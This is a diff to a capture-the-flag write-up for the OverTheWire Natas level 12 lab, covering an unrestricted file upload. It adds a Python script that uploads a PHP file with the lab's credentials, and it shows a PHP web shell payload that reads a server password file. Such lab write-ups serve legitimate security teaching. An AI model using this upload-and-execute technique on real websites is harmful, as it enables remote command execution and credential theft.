@@ -18,18 +18,41 @@ Looks like it spits out an error.
 
 It also seems that our filename is being changed to a random filename with a `.jpg` extension everytime we upload.
 
-Looking at the source code we see there are 2 major function that come in to play.
+Looking at the source code we see there are 2 major code blocks that come in to play.
 
 ![source](./img/source.png)
 
-The first being the `makeRandomPathFromFilename` which creates a random filename with an extension that is provided with the filename. If we looks closely to the bottom, the snippet `value="<? print genRandomString(); ?>.jpg" />` is forcing it so our filename will always end in `.jpg` but we can probably change that.
+The first being the `makeRandomPathFromFilename` which creates a random filename with an extension that is provided with the filename. If we looks closely to the bottom, the snippet `value="<? print genRandomString(); ?>.jpg" />` is forcing it so our filename will always end in `.jpg` but we can probably change that if we upload the file directly wihtout going through that piece of code.
 
 The second being that `if(array_key_exists("filename", $_POST)) { ` that will upload our file if we do a `POST` request on the page.
 
 Now let's create a python script that will upload our file directly to the web server.
 
 ```python
+#!/usr/bin/env python
 
+import requests
+
+url = 'http://natas12.natas.labs.overthewire.org'
+
+user = 'natas12'
+
+pw = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
+
+# Fill out the necessary Form data
+data = {
+	"filename" : "test.php",
+	"MAX_FILE_SIZE" : "1000",
+}
+
+# File to upload
+files = {
+	"uploadedfile" : open('test.php','rb')
+}
+
+r = requests.post(url,auth = (user,pw), data = data, files = files )
+
+print(r.text)
 ```
 
 Looks like we are successful in uploading our file, it preserved the `.php` extension that will hopefully execute on the website.
@@ -48,8 +71,10 @@ This payload will run the `system` function in PHP which will execute shell comm
 echo '<?php system("cat /etc/natas_webpass/natas13"); ?>' > test.php
 ```
 
-Uploading the file once more with python, we navigate to that file and we get the password.
+Uploading the file once more with python.
 
 ![exploit](./img/exploit.png)
+
+We get the password for natas13.
 
 ![password](./img/password.png)
